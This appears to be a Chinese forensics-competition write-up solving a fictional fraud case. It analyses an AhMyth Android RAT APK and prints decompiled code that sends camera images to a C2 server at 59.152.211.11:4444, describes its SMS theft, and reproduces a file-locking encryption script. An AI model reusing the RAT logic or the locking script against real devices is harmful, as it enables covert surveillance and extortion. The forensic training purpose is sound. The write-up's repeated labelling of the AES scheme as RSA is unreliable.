@@ -1,0 +1,2346 @@
+第十届 美亚杯中国电子数据取证大赛 团体赛 题解 - XD Forensics Wiki
+https://forensics.xidian.edu.cn/writeups/MeiyaCup2024Group/
+
+第十届 美亚杯中国电子数据取证大赛 团体赛 题解
+¶
+Author
+NoahTie @ 猫猫啥也不会
+写在前面
+¶
+检材容器密码:
+bWuDw#3qthnMpLz8+6>c!CHFmPKgB&?J5f:A4^a);d=*ysv7Rxn>fzT^BH8;JV#qSpF5C7kb4DsA$?a+9E6KZ3\xRwW=(jceu:NvvXD7r@&9YJz/nwbh<A:Pma4(K%3!
+也是大半年没有碰过取证了, 一方面重新熟悉一下做取证题的感觉, 另一方面看校内还没有人写复盘, 就用 2 天时间在不借助网络的情况下做了个复盘. 事后对照了
+官方发布的答案
+, 对做错的几道题进行了修正, 但依然有些题目存疑.
+这次比赛的检材之间联系还是比较紧密的(Ben 的附加材料除外, 完全意义不明), 很多题目的答案来源都不止一处, 尤其是对涉及到 WhatsApp 群组聊天记录的题目, 完全可以去自动分析工具可以分析的检材中寻找答案.
+这次比赛从我复盘的情况来看, 没有遇到难度非常高的题目. 很多应用无法被自动分析工具解析到也是意料之中的情况了, 毕竟每年美亚杯都会遇到徒手翻数据库的情况. 不过今年相对更多一些.
+照惯例, 总结一下复盘时用到的工具的清单:
+介质取证软件
+火眼证据分析软件
+AutoPsy
+X-Ways Forensics 20.5 SR-1
+FTK Imager
+UFS Explorer Professional Recovery 10
+系统仿真软件
+火眼仿真取证
+逆向分析软件
+JEB Pro 5.27
+IDA Pro 9.1
+Detect It Easy 3.10
+雷电 APP 智能分析
+内存取证工具
+Volatility 3
+流量分析工具
+科来网络分析系统
+数据库工具
+DB Browser for Sqlite (sqlitebrowser)
+pgAdmin & PostgreSQL
+虚拟机软件
+VMware Workstation Pro
+其它工具
+VeraCrypt
+VScode
+010 Editor
+Irfan View
+BIP-39
+Cyber Chef
+MFT Browser
+Windows Registry Recovery
+EventLogExpert
+网矩数据分析软件
+Python 3.13 with Jupyter
+案情
+¶
+于 2024 月 9 月某日, 警方于香港湾仔调查一宗怀疑凶杀案件, 并拘捕了男子 David, 涉嫌因金钱问题杀害了其太太 Clara. 你对 David 的电子设备进行了取证检查, 怀疑他与其他三名成员 Alice, Ben 及 John 同属一个诈骗组织并进行不法勾当, 相信他们与案有关. 及后警方检取有关人士的手机和计算机等作进一步调查. 请分析以下的资料, 还原事件经过.
+资料:
+Alice MacOS 系统计算器镜像档案 (Alice_Macbook.e01)
+Alice 的安卓手机镜像档案 (Alice_Mobile.bin)
+Ben 的 Windows 系统计算器镜像档案 (Ben_Laptop.zip)
+Ben 的 Windows 系统计算器分析档案 (BenAttachment.zip)
+Ben 的 iOS 手机系统档案 (BeniPhone.zip)
+Ben 的 U 盘镜像档案 (BenUSB.e01)
+Ben 的 SD 咭镜像档案 (BenSDCard.e01)
+Ben 跳转站镜像档案 (Ben_Jumpstation.zip)
+John 的 Windows 系统计算器镜像档案 (John_desktop.e01)
+John 的 iOS 手机系统备份文件(John_Smartphone_itunebackup.zip)
+John 的 NAS 盘镜像档案 1 (John_NAS_1.E01)
+John 的 NAS 盘镜像档案 2 (John_NAS_2.E01)
+John 的 VR 仪器镜像档案 (John_VR.zip)
+建议软件列表:
+Windows / MacOS 系统分析工具
+数据库分析工具 (参考例子: DB browser for SQLite)
+手机系统分析工具 (参考例子: 手机大师, Autopsy)
+虚拟机挂载工具
+APK 分析工具 (参考例子: Android studio, APKTool)
+网络封包分析工具 (参考例子: Wireshark)
+逆向工程软件工具 (参考例子: X64 debugger, Cheat Engine)
+回复种子计算工具 (参考例子: Mnemonic Code Converter)
+其他分析工具 (参考例子: Kali Linux, Python 3.12, Hex Editor, Registry explorer, Maltego)
+Alice 的手机
+¶
+在个人赛的最后一部分, 你对 David 的数字设备进行了取证检查, 发现他与一名成员 Alice 有可疑的沟通. 你现在分析 Alice 的手机. 
+参考
+Alice Mobile.bin
+.
+1 Alice 所使用的手机网络运营商公司的名称是什么?
+¶
+答案
+Lucky HK
+2 Alice 所使用的谷歌电子邮件地址是?
+¶
+答案
+alicecutter94\@gmail.com
+3 谁向 Alice 发送了一个含有个人资料的
+.xlsx
+文件?
+¶
+选项
+A. David
+B. John
+C. Ben
+D. Amy
+E. Harry
+答案
+B
+在文件分类中可以看到这个 Excel 文件:
+可以看到, 文件位于 WhatsApp 的应用数据目录中. 在 WhatsApp 的文件传输记录中, 可以看到 Johnhohn 在群"三五成群"中发送了 1 份, 几小时后 Alice 给自己发送了 1 份.
+4 承上题, 该文件的 MD5 哈希值是?
+¶
+答案
+5457D5A68673B8D093D7666D515CCCB2
+5 Alice 于 Facebook 所建立的群组是?
+¶
+选项
+A. 大学生炒散搵工群
+B. 最全面搵工推介
+C. 全港笋工好工推介2024
+D. 搵工全职兼职
+E. 搵工WhatsApp群
+答案
+C
+Facebook 的群组英文并非 Group, 而是 Community.
+这道题选项在搞事情, 除了正确选项剩下的都是繁体中文的原文, 虽然可以在检材中搜索到, 但并不是正确选项. 只有真正的选项被写成了简体中文(全港筍工好工推介2024), 检材中无法直接搜到.
+我就说打美亚杯得学学繁体字和粤语吧?
+6 Alice 在 2024 年 8 月 15 日于哪个地铁站和"客服人员"相约见面?
+¶
+选项
+A. Chai Wan
+B. Tai Koo
+C. Wan Chai
+D. Central
+E. Mong Kok
+答案
+C
+后面的题目描述有提示, 客服人员的 id 为 ZHANG WEI. 看起来像是真名, 大概是 WhatsApp 中的 id.
+关于约见的消息是在群聊"Fast cash"中的:
+约在了湾仔地铁站.
+7 受骗女子欧凯被指示将虚拟货币转到哪个钱包地址?
+¶
+答案
+0xdA9AE5b1bA2F404D0490dcd18a5C2247866FD148
+接上题. 相关信息还是在群里:
+8 Alice 指示"客服人员"使用什么交通工具离开香港?
+¶
+选项
+A. 火车
+B. 私家车
+C. 飞机
+D. 船
+E. 货柜车
+答案
+D
+接上题, 还是在群聊里:
+说安排船夫, 所以是坐船离开.
+9 客服人员"ZHANG WEI"的银行卡号是多少?
+¶
+答案
+621234 5678987654321
+银行卡号在 WhatsApp 的聊天记录中:
+10 Alice 总共在 Facebook 上发布了多少张照片?
+¶
+本题存疑
+.
+选项
+A. 1
+B. 3
+C. 5
+D. 7
+E. 9
+上传记录火眼没有自动取证到, 上传过的历史记录存储在
+/data/com.facebook.katana/app_uploads/
+目录下:
+每个文件夹是上传的 1 个媒体文件, 依次浏览后发现都是照片. 一共上传了 12 张照片.
+其中有部分照片重复, 用 hash 去一下重之后有 8 张不同的.
+但是选项既没有给 12, 也没有给 8.
+后来又在数据库
+/data/com.facebook.katana/databases/local_media_db
+里看到了与媒体有关的信息:
+确认了是 9 张图片. 然而官方答案又是 5 张.
+11 应用程序 WhatsApp 的数据库(
+msgstore.db
+)中, 哪个
+message_type
+代表发送的内容是表情包(Sticker)?
+¶
+答案
+20
+聊天记录中"李静"发送了一个表情包:
+将消息的接收时间转换为时间戳, 用时间去数据库里筛选:
+看到
+message_type
+是 20.
+12 在 Alice 手机中, 哪一个数据库记录了照片的数据?
+¶
+答案
+external.db
+在图片的取证结果就能看到来源:
+13 承上题, 该文件的最后修改日期和时间是?
+¶
+答案
+2024-08-30 17:28:29
+接上题.
+John 的手机
+¶
+从 Alice 的手机中发现, 她一直与一名叫 John 的成员保持联系. 你接着分析 John的 手机. 
+参考
+John_Smartphone_itunebackup.zip
+, 备份密码是
+1234
+.
+14 在 WhatsApp 通讯软件内, "三五成群"群组于什么时间创建?
+¶
+选项
+A. 2024-08-29 17:44:38
+B. 2024-07-25 15:22:09
+C. 2024-07-30 12:45:50
+D. 2024-07-30 16:15:34
+答案
+B
+15 照片
+IMG_0007
+的创建日期时间是?
+¶
+选项
+A. 2024年8月14日星期三下午02:54
+B. 2024年9月02日星期三下午12:54
+C. 2024年8月14日星期三下午12:54
+D. 2024年8月16日星期五下午12:54
+答案
+C
+16 John 曾使用什么通讯软件联系 Ben?
+¶
+选项
+A. Reddit
+B. WhatsApp
+C. WeChat
+D. Line
+答案
+B
+在 WhatsApp 的聊天记录里:
+17 于"三五成群"群中，电子表格文件
+Personal_data.xlsx
+是由哪一个电话号码发送到该群组的?
+¶
+答案
+85269711024
+是 John 自己发送的.
+WhatsApp 的用户 id 格式就是
+<区号 & 电话号码>@s.wahtsapp.net
+.
+Ben 的手机
+¶
+参考
+BeniPhone.zip
+.
+火眼会将这个压缩包识别为 iTunes 备份文件, 并要求输入密码. 在不输入密码的情况下, 火眼不会挂载文件. 但实际上, 这个压缩包并不是 iTunes 的备份文件, 而是类似于个人赛中 Emma 的 iPhone 那样的提取自 iPhone 的文件集合.
+这里主要使用 AutoPsy 进行分析.
+18 根据 Ben 手机内通讯软件的记录, 以下内容是在什么时间接收或发出的?
+¶
+"This is a RAT APK that allows us to control Android devices remotely, enabling data access, monitoring and manipulation through an interface."
+选项
+A. 由 Ben 于 2024-08-02 16:17:07 接收
+B. 由 Ben 于 2024-08-05 15:53:37 发出
+C. 由 Ben 于 2024-08-05 16:58:12 接收
+D. 由 Ben 于 2024-08-05 17:22:47 发出
+在
+ChatStorage.sqlite
+数据库里, 搜索可以找到消息:
+ZMESSAGEDATE
+是消息创建时间,
+ZISFROMME
+为 1 代表是用户发送的消息.
+将 Cocoa Core Time 转换成 Datetime:
+转换出来的是 UTC 时间.
+19 根据 Ben 手机内的照片记录,
+IMG_0011.PNG
+是通过哪种方式生成的?
+¶
+选项
+A. 从互联网下载
+B. 手机拍摄
+C. 手机截图
+D. 以上皆不是
+答案
+C
+在
+Photos.sqlite
+中.
+在
+ZASSEST
+表中可以看到文件记录:
+在
+ZCLOUIMASTER
+表中可以看到图片的来源是
+SpringBoard
+:
+SpringBoard 是 iOS 系统的截图组件, 也可以查看原图来判断:
+综合分析
+¶
+你发现了该犯罪团伙似乎有一个共同的聊天群, 其中包含有关可疑资本管理(与虚拟货币相关)的更多线索.
+提及到的群即是 WhatsApp 的群"三五成群". 可以在 Alice 的手机中看到.
+20 John、David 及 Alice 筹集资金的目的是什么?
+¶
+选项
+A. 建立一个网站给人投资虚拟货币
+B. 建立一个网站用作行骗
+C. 创建虚拟货币钱包用作洗黑钱
+D. 写一个Android (APK)应用程序包用作沟通
+答案
+B
+我就说得学粤语吧
+21 哪一个虚拟货币地址储存 John、David 及 Alice 所筹集的 IDFC?
+¶
+选项
+A. 0xe90ad3f80e39e83b533eef3ed23c641ec51089c6
+B. 0x04d079c7ace663bbe1d2c201072d63b036d16ccd
+C. 0x10a4f01b80203591ccee76081a4489ae1cd1281c
+D. 0x8155c0b8a0c95424f433d8ab6342086f0433e6c4
+选项
+A. 0xe90ad3f80e39e83b533eef3ed23c641ec51089c6
+B. 0x04d079c7ace663bbe1d2c201072d63b036d16ccd
+C.
+0x10a4f01b80203591ccee76081a4489ae1cd1281c
+D. 0x8155c0b8a0c95424f433d8ab6342086f0433e6c4
+在 WhatsApp 地聊天记录中看到 David 说"把我們昨天湊錢的資金存入了 IDFC 錢包", 所以资金应该是在 2024-08-13 存入钱包的.
+后面 David 的电脑部分有提示存在一个 IDFC 的交易记录. 就是个人赛中 David 的设备中的交易记录
+export-token-0x56E7A6dd8aA1c78ba77944C94c43054978E89b7b.csv
+.
+22 Alice 总共使用了多少个虚拟货币地址直接接收受害人的 IDFC?
+¶
+选项
+A. 1
+B. 3
+C. 6
+D. 7
+答案
+C
+0x044349C9De3c116c7fdea1faDFE75273FF03d423
+0x85Bd4e7507ea6Bdc62feCFAc03871403F3d0859d
+0xdA9AE5b1bA2F404D0490dcd18a5C2247866FD148
+0x405f135502c05cf9EC57C67bE3a5Cf76d83aE882
+0x1759f012Ca0Ab962aCF5a8e2F5cD530Db125821D
+0x4756ea13157ba5fcfB996674d4EAc387cF7214Ca
+David 的电脑
+¶
+参考
+David_Laptop_64GB.e01
+.
+这是第一次美亚杯中出现团体赛要用到个人赛检材的情况.
+之前我就考虑过会不会出现这种情况, 所以每次比赛都会专门留着个人赛的导出的文件和案件档案, 没想到这次真的用上了.
+23 参考 IDFC 交易记录, 在收取受害人的 IDFC 后, 它之后会再流向哪些虚拟货币地址?
+¶
+选项
+A. 0xb2e3dbea311511ec5bda3e85e061f15366f888a6
+B. 0x70544880875fe907cee383873ca58da23378caa5
+C. 0x152c90200be61a540875f2a752c328bd19dbfb87
+D. 0x59eb2c55eefdd4d8af2886c9fd8fc6f465c3e220
+答案
+BCD
+掏出之前做流水分析的时候写的 Python 小工具画一个大致的流水图, 把题目中的几个地址标记出来:
+红色圈起来的是收取受害者 IDFC 的地址(1 级)
+0x044349C9De3c116c7fdea1faDFE75273FF03d423
+0x85Bd4e7507ea6Bdc62feCFAc03871403F3d0859d
+0xdA9AE5b1bA2F404D0490dcd18a5C2247866FD148
+0x405f135502c05cf9EC57C67bE3a5Cf76d83aE882
+0x1759f012Ca0Ab962aCF5a8e2F5cD530Db125821D
+0x4756ea13157ba5fcfB996674d4EAc387cF7214Ca
+流水流向紫色圈起来的地址(2 级)
+0x152c90200be61a540875f2a752c328bd19dbfb87
+0x59eb2c55eefdd4d8af2886c9fd8fc6f465c3e220
+0x70544880875fe907cee383873ca58da23378caa5
+最终全部流向深红色方框的地址
+0x63a8ba1df0404ee41f7c6af8efd2f54006f32042
+.
+用弘连的网矩也可以,
+但是稍微比较麻烦. 不知道是不是因为我不会用软件导致的.
+研究了一下使用说明, 挺好用的, 是我之前不会用. 直接把 csv 导入, 手动分配一下字段, 生成一个实体关联图就行, 用层级图会舒服一点, 需要手动微调一下节点位置:
+24 承上题, 上述 IDFC 去到那些地址后, 谁掌管这些IDFC?
+¶
+提示：分析 IDFC 的交易记录及个人赛所搜集的证据
+选项
+A. Alice (回复种子: pumpkin fold behind captain shoulder demand print hospital like smoke gate weird)
+B. Ben (回复种子: wrap muscle rhythm stamp bundle zebra gorilla shuffle common tattoo ginger awake)
+C. John (回复种子: abandon among anxiety pizza evidence face quiz ripple nerve pact nasty unveil)
+D. David (回复种子: stock avocado grab clay light sadness segment ancient toe talk elder oil)
+如果还保留着初赛的记忆, 能想起来 David 的回复种子回复出来的地址是
+0x63a8ba1df0404ee41f7c6af8efd2f54006f32042
+.
+想不起来的话就把选项里的回复种子依次恢复地址, 和第 23 题中流水最终流向的地址对比.
+25 2024 年 9 月, Tom Victor 带同其秘书 Amy 来到警署报案, 称其秘书被骗子用人工智能视频在 2024 年 8 月 29 日早上骗去 10,000,000 IDFC. 请找出该交易的交易哈希?
+¶
+选项
+A. 0x04dcfbb681e125076c7f3c79ddee7e2b4859881ad031e90cf7fc251a483dd92d
+B. 0x04dcfbb681e125076c7f3c79ddee7e2b4859881ad031e90cf7fc251a4835792a
+C. 0x04dcfbb681e125076c7f3c79ddee7e2b4859881ad031e90cf7fc251a4835792d
+D. 0x04dcfbb681e125076c7f3c79ddee7e2b4859881ad031e90cf7fc251a4835792c
+答案
+C
+还是在 David 电脑里的 csv 文件里, 根据时间和收款钱包的地址可以找到:
+26 就现时搜集到的证据、
+David_Laptop_64GB.e01
+内的资料及 IDFC 的资金流分析, 下列哪些虚拟货币地址是最终诈骗集团储存犯罪所得的地址?
+¶
+选项
+A. 0x63a8ba1df0404ee41f7c6af8efd2f54006f32042
+B. 0xe90ad3f80e39e83b533eef3ed23c641ec51089c6
+C. 0x10a4f01b80203591ccee76081a4489ae1cd1281c
+D. 0x90f73497e4446f6cf9881213c32d6af66d799fe5
+答案
+AD
+接上题, 参照第 23 题.
+第 23 题的分析中, 知道一个地址是
+0x63a8ba1df0404ee41f7c6af8efd2f54006f32042
+.
+上题提到另外一位受害人, 根据交易记录中的记录可以找到另外一个收款地址:
+Ben 的电脑
+¶
+参考
+Ben_Laptop.zip
+.
+感觉出题人是有点离谱了, e01 镜像压在 zip 包里...
+这部份安卓逆向用的工具都是 JEB.
+27 你现在查看 Ben 的笔记本电脑, 并发现了 APK 文件. 一般而言, APK的关键组成部分是什么?
+¶
+选项
+A. AndroidManifest.xml, classes.dex, resources.arsc, res/
+B. AndroidManifest.xml, META-INF/, res/, assets/
+C. classes.dex, lib/, AndroidManifest.xml, META-INF/
+D. res/, assets/, AndroidManifest.xml, classes.dex
+答案
+A
+常识题. 随便找个 apk 看一眼也行.
+28
+Joshe_Investment.apk
+没有
+classes.dex
+文件, 而是有
+smali
+文件, 以下哪一个陈述是正确的?
+¶
+选项
+A. 这是一个经过逆向工程制作的 APK
+B. 该 APK 已损坏
+C. 文件结构不完整
+D. APK 包含加密代码
+答案
+A
+也算是常识题了. 原始APK中的
+classes.dex
+被反编译工具转换为
+smali
+代码, 但后续未重新打包成 APK.
+apk 在桌面上.
+29 Ben 使用了哪个工具包生成恶意 APK 以控制受害者的设备?
+¶
+选项
+A. Metasploit
+B. SpyNote
+C. QuasarRAT
+D. AhMyth
+答案
+D
+看包名是 AhMyth:
+GitHub - Morsmalleo/AhMyth: Cross-Platform Android Remote Administration Tool
+.
+30 哪个
+xml
+文件被特别添加为主活动(
+activity_main
+)的布局文件?
+¶
+选项
+A. activity_main.xml
+B. main_activity.xml
+C. main.xml
+D. Thisismain.xml
+答案
+D
+31 被指定为主活动层(
+activity_main layer
+)
+xml
+文件的公共 ID?
+¶
+选项
+A. 0x7f040000
+B. 0x7f050000
+C. 0x7f060000
+D. 0x7f070000
+答案
+D
+见上题.
+32 应用程序没有要求的权限?
+¶
+这道题有点问题, 应该是多选题, 比赛的时候设置的是单选题.
+选项
+A. android.permission.READ_CONTACTS
+B. android.permission.USE_FINGERPRINT
+C. android.permission.WRITE_CALENDAR
+D. android.permission.ACCESS_FINE_LOCATION
+Manifest 中声明的权限:
+33 在
+ahmyth/mine/king/ahmyth/
+文件夹下的
+b.smali
+文件的主要功能是什么?
+¶
+选项
+A. 管理网络连接
+B. 处理相机操作并捕捉图像
+C. 管理应用程序设置
+D. 处理数据库操作
+答案
+B
+c()
+的作用是获取 json 格式的手机摄像头信息：
+e()
+用于存储照片;
+f()
+用于拍照:
+34 在
+ahmyth/mine/king/ahmyth/
+文件夹下的
+b.smali
+文件中, 字节数组在发送到服务器之前执行了哪一系列操作, 最终的图像格式是?
+¶
+选项
+A. 字节数组被译码、加密、转换为 PNG 格式,并发送到服务器
+B. 字节数组被译码、压缩成 JPEG 格式,并封装到 JSONObject 中再发送到服务器
+C. 字节数组被编码为 String, 压缩成 BMP 格式,转换为字节数组并发送
+D. 字节数组被编码为 String, 压缩成 JPEG 格式,转换为字节数组并发送
+答案
+B
+反编译源码:
+Java
+private
+void
+e
+(
+byte
+[]
+arr_b
+)
+{
+try
+{
+// 生成位图格式的图片
+Bitmap
+bitmap0
+=
+BitmapFactory
+.
+decodeByteArray
+(
+arr_b
+,
+0
+,
+arr_b
+.
+length
+);
+ByteArrayOutputStream
+byteArrayOutputStream0
+=
+new
+ByteArrayOutputStream
+();
+// 将位图压缩为 JPEG 格式
+bitmap0
+.
+compress
+(
+Bitmap
+.
+CompressFormat
+.
+JPEG
+,
+20
+,
+byteArrayOutputStream0
+);
+/* 一个 JSON 对象, 内容为:
+{
+"image": true,
+"buffer": "<图片文件字节流>",
+}
+*/
+JSONObject
+jSONObject0
+=
+new
+JSONObject
+();
+jSONObject0
+.
+put
+(
+"image"
+,
+true
+);
+jSONObject0
+.
+put
+(
+"buffer"
+,
+byteArrayOutputStream0
+.
+toByteArray
+());
+// 调用方法 e.a().b().a()
+e
+.
+a
+().
+b
+().
+a
+(
+"x0000ca"
+,
+new
+Object
+[]
+{
+jSONObject0
+});
+}
+catch
+(
+JSONException
+jSONException0
+)
+{
+jSONException0
+.
+printStackTrace
+();
+}
+}
+去看看
+e
+类的源码(有删减):
+与网络连接有关.
+35 在
+ahmyth/mine/king/ahmyth/
+文件夹下的
+b.smali
+文件中, 图像在发送到服务器时的压缩比率是多少?
+¶
+选项
+A. 50%
+B. 30%
+C. 20%
+D. 10%
+答案
+C
+见上题, 关于图像压缩的代码是:
+Java
+bitmap0
+.
+compress
+(
+Bitmap
+.
+CompressFormat
+.
+JPEG
+,
+20
+,
+byteArrayOutputStream0
+);
+猜测第 2 个参数 20 是压缩比例.
+36 在
+ahmyth/mine/king/ahmyth/
+文件夹下的
+ConnectionManager.smali
+,
+sendReq
+方法的目的是什么?
+¶
+选项
+A. C2 服务器向受感染的设备发送请求
+B. 处理用户接口的更新
+C. 建立到 C2 服务器的网络连接
+D. 管理应用程序设置
+答案
+C
+回应服务端的存活检测 Ping:
+执行服务端指令:
+37 承上题, C2 服务器的 IP 地址及端口号?
+¶
+选项
+A. IP:192.168.1.1:8080
+B. IP:10.0.0.1:80
+C. IP:172.16.0.1:443
+D. IP:59.152.211.11:4444
+答案
+D
+见第 34 题.
+访问的 Uri 是
+http://59.152.211.11:4444
+.
+38 在
+ahmyth/mine/king/ahmyth/
+文件夹下的
+g.smali
+文件中,
+MediaRecorder
+被初始化用于录音. 如果
+setAudioSource()
+方法使用了错误的参数, 会发生什么, 且这将如何影响录音过程的功能?
+¶
+选项
+A. 应用将以默认设置继续录音,但音质可能会降低
+B. MediaRecorder 会抛出 IllegalStateException,并阻止录音的开始
+C. 录音将继续,但文件格式将与指定的输出格式不兼容
+D. 应用只会在调用 start() 方法后由于无效的音频编码而崩溃
+答案
+B
+setAudioSource
+用于设置麦克风来源.
+39 在
+ahmyth/mine/king/ahmyth/
+文件夹下的
+g.smali
+文件中,
+TimerTask
+用于在启动
+MediaRecorder
+后调度动作.
+TimerTask
+在这个过程中有什么作用?
+¶
+选项
+A. 它以设定的间隔暂停录音,以更好地管理资源
+B. 它通过在设定的间隔调整录音参数来提高音质
+C. 它定期压缩录制的音讯文件以节省存储空间
+D. 它监控录音时长,并根据录音时间安排事件
+答案
+D
+TimerTask.schedule 用在计时结束后执行方法. 执行的方法
+g.c()
+是
+a
+的新实例:
+g.a
+是类中的 MediaRecorder 实例.
+g.b
+则是第 36 题中的受控端类. 即开启新的监听, 等待新指令.
+40 在
+ahmyth/mine/king/ahmyth/
+文件夹下的
+h.smali
+文件中,
+method a0
+和
+method b0
+的主要功能有什么区别?
+¶
+选项
+A. Method a() 是检索存储在设备上的联系人清单并将其格式化为 JSONArray,而 method b() 是从被入侵的设备向联系人发送消息
+B. Method a() 是收集收件箱中的所有 SMS 短信,而 method b() 是利用被入侵的设备发送 SMS 短信
+C. Method a() 是向指定的电话号码发送包含自定义消息内容的 SMS 短信,method b() 是接收发送确认
+D. Method a() 是从设备中检索 MMS 短信,而 method b() 是使用被入侵的设备发送 MMS 短信
+答案
+B
+很明显
+a
+的功能是获取短信;
+b
+的作用是发送短信.
+JEB 的助手功能(需要联网)很好用, 直接自动识别出来了:
+甚至整个识别, 有点像 IDA 的 Lumina 插件:
+41 在
+ahmyth/mine/king/ahmyth/
+文件夹下的
+h.smali
+文件中,
+method b0
+需要哪些参数?
+¶
+选项
+A. method b() 请求两个字符串参数, 联系人姓名和联系人号码
+B. method b() 请求一个文件路径的字符串参数和一个数据内容的字符串参数
+C. method b() 请求一个 URL 的字符串参数和一个负载数据的字符串参数
+D. method b() 请求两个字符串参数, 接收者的电话号码和消息内容
+答案
+D
+接上题.
+只要 2 个参数, 只能是手机号码和短信内容了.
+剧情
+¶
+在分析 Ben 的笔记本电脑时, 你从调查人员那里获得了以下信息: 
+在对一名被捕的犯罪集团成员进行审讯时获得的情报显示, Ben 对 John 心怀怨恨, 因为 John 扣留了 Ben 的犯罪收益份额. 因此, Ben 加密了 John 的机密文件夹, 以限制他的访问.
+关于这部分题目的文件均位于 Ben 的电脑桌面上:
+42 解密
+secretExcel.encrypted
+的第一步应该是什么?
+¶
+选项
+A. 生成新的随机密钥
+B. 打开加密文件并读取文件的前 16 个字节
+C. 压缩加密档
+D. 删除加密档
+选项
+A. 生成新的随机密钥
+B.
+打开加密文件并读取文件的前 16 个字节
+C. 压缩加密档
+D. 删除加密档
+这道题是真白给... 不过还是来写一下恢复脚本吧, 后面的题会用到. 题目用的是 RSA 加密.
+加密脚本:
+Python
+def
+encrypt_file
+(
+file_path
+,
+password
+):
+salt
+=
+get_random_bytes
+(
+32
+)
+key
+=
+PBKDF2
+(
+password
+,
+salt
+,
+dkLen
+=
+32
+,
+count
+=
+100000000
+)
+file_path
+=
+os
+.
+path
+.
+abspath
+(
+file_path
+)
+output_dir
+=
+os
+.
+path
+.
+dirname
+(
+file_path
+)
+folder_name
+=
+os
+.
+path
+.
+splitext
+(
+os
+.
+path
+.
+basename
+(
+file_path
+))[
+0
+]
+encrypted_path
+=
+os
+.
+path
+.
+join
+(
+output_dir
+,
+f
+"
+{
+folder_name
+}
+.encrypted"
+)
+os
+.
+makedirs
+(
+os
+.
+path
+.
+dirname
+(
+encrypted_path
+),
+exist_ok
+=
+True
+)
+with
+open
+(
+file_path
+,
+'rb'
+)
+as
+f_in
+,
+open
+(
+encrypted_path
+,
+'wb'
+)
+as
+f_out
+:
+data
+=
+f_in
+.
+read
+()
+cipher
+=
+AES
+.
+new
+(
+key
+,
+AES
+.
+MODE_CBC
+)
+f_out
+.
+write
+(
+cipher
+.
+iv
+)
+f_out
+.
+write
+(
+salt
+)
+encrypted_data
+=
+cipher
+.
+encrypt
+(
+pad
+(
+data
+,
+AES
+.
+block_size
+))
+f_out
+.
+write
+(
+encrypted_data
+)
+print
+(
+f
+"File encrypted successfully:
+{
+encrypted_path
+}
+"
+)
+解密脚本:
+Python
+def
+decrypt_file
+(
+encrypted_path
+,
+password
+):
+with
+open
+(
+encrypted_path
+,
+'rb'
+)
+as
+f_in
+:
+iv
+=
+f_in
+.
+read
+(
+16
+)
+salt
+=
+f_in
+.
+read
+(
+32
+)
+encrypted_data
+=
+f_in
+.
+read
+()
+key
+=
+PBKDF2
+(
+password
+,
+salt
+,
+dkLen
+=
+32
+,
+count
+=
+100000000
+)
+cipher
+=
+AES
+.
+new
+(
+key
+,
+AES
+.
+MODE_CBC
+,
+iv
+)
+decrypted_data
+=
+unpad
+(
+cipher
+.
+decrypt
+(
+encrypted_data
+),
+AES
+.
+block_size
+)
+output_dir
+=
+os
+.
+path
+.
+dirname
+(
+encrypted_path
+)
+original_name
+=
+os
+.
+path
+.
+splitext
+(
+os
+.
+path
+.
+basename
+(
+encrypted_path
+))[
+0
+]
+.
+replace
+(
+'.encrypted'
+,
+''
+)
+decrypted_path
+=
+os
+.
+path
+.
+join
+(
+output_dir
+,
+original_name
+)
+with
+open
+(
+decrypted_path
+,
+'wb'
+)
+as
+f_out
+:
+f_out
+.
+write
+(
+decrypted_data
+)
+43 在加密文件
+secretExcel.encrypted
+中, 初始向量(IV)的值是什么?
+¶
+选项
+A. 64f4e21c1e4cc3a60137da79e75bf973
+B. a6b7e84f91827c3d2a94bfed7b5ca9d1
+C. 3b29d2a46aab93bba07c6893d1b8e93a
+D. 7f8d9b2a14c5aef3786d12c4b6e2d4f9
+答案
+A
+根据加密脚本, 前 16 Bytes 是 iv:
+44 在加密文件
+secretExcel.encrypted
+中, 盐值(SALT)是什么?
+¶
+选项
+A. 5d5ca840accf95169288de5bf85dacd7bb05ad888afac26efd05cc436c4a5424
+B. a3d9f0e4b7c8d5a9c2e7f0b3a5d7c6b1b8e7a2f9c3d1e4f5a6b9c0d7e1f2b4c8
+C. f2e1d0c9b8a7f6e5d4c3b2a1e8f7d6c5b4a3d2f1e0c9b8a7d6e5c4b3a2f1e0d9
+D. c7b6a5d4e3f2d1c0e9d8b7a6f5e4d3c2b1a0e9f8d7c6b5a4b3c2d1e0f9e8d7c6
+答案
+A
+根据加密脚本, iv 后的 32 Bytes 是 salt:
+45 查看
+encrypt.py
+代码, 如果更改
+PBKDF2
+的
+count
+参数会产生什么影响?
+¶
+选项
+A. 仅影响解密时所需的计算性能
+B. 仅影响加密的安全性
+C. 同时影响所需的计算性能和安全性
+D. 没有影响
+答案
+C
+众所周知, 相同算法情况下, 牺牲性能提高安全性.
+count 参数是 RSA 加密时 PRF 的迭代次数.
+密码学学过的, 还记得吗?
+46 根据分析及计算后, 解密
+secrectExcel.encrypted
+所用的 key 具体值是什么?
+¶
+选项
+A. b'\xb2T\xc2\xb9\xb7wf9\x95Y\xcc)\xec\xff\x0e\xb6\xf6\x03\x92z\xc6\xe4\x11P\x07@\x94\xbcl\xfd\x95\xc5';
+B. b'/T_\r\x1e\xb8\xe6_\xcd\x01\x95\xde\xb8\r\xb3\xb6\nVp\xeb\xf1S\xb4m\xd6wH\xc4\xc8\xcf\xed';
+C. b'\xea\x15\xf9\x05\x85\xe8h\x87\xc4\xf0O\x8a\xba1\x96\x05b\xf9\xa3g\xbaMm\xa4\t,\xe0Q\x87\x8e\xfb\x8c';
+D. b'q!\xae2\x1fvo\xb6]\xfb\x1f\x8c\xe5\x18\x03\x0b\xcc\xc93\xf7/us\x8a\x1e;\xd2\xe3\x81\x05\xaa\x04'
+答案
+D
+在解密脚本中输出密钥值即可:
+47 解密后的 Excel 文件中, 程琳的电话号码是什么?
+¶
+选项
+A. +852 106523728123
+B. +852 180300901529
+C. +60 243428690343
+D. +63 060940949159
+答案
+A
+48 解密后的 Excel 文件中, 周亮的 ID/Passport Number 是什么?
+¶
+答案
+510800196504216464
+60 你注意到 Ben 的笔记本电脑上安装了暗网 Tor. 请回答以下问题: Ben 应该输入什么命令来在 Kali Linux 中执行 Tor 浏览器?
+¶
+答案
+torbrowser-launcher
+常识题.
+如果不知道的话可以在 Ben PC 镜像里找到 VMware 虚拟机:
+添加为新检材或者仿真都可以. 在应用列表里面就可以看到, 或者命令行自动补全也能看到. 因为有密码, 如果想直接运行虚拟机的话, 需要改 grub 配置去清除密码.
+61 Ben 经常使用 Tor 浏览器, 该 Tor 浏览器把多少个
+.onion
+链接添加为书签?
+¶
+选项
+A. 1
+B. 2
+C. 3
+D. 4
+答案
+D
